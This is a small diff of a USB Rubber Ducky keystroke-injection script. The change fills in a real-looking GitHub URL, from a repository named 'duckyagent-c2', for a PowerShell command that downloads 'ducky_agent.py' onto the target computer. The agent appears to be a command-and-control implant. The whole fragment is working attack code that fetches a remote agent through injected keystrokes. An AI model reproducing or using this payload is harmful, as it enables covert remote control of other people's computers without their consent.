@@ -22,7 +22,7 @@ ENTER
 DELAY 200
 
 REM Download the agent from your GitHub repo or server
-STRING powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YOUR_USERNAME/your_repo/main/DuckyScripts/ducky_agent.py' -OutFile 'ducky_agent.py'"
+STRING powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tymamana1/duckyagent-c2/main/ducky_agent.py' -OutFile 'ducky_agent.py'"
 ENTER
 DELAY 5000
 
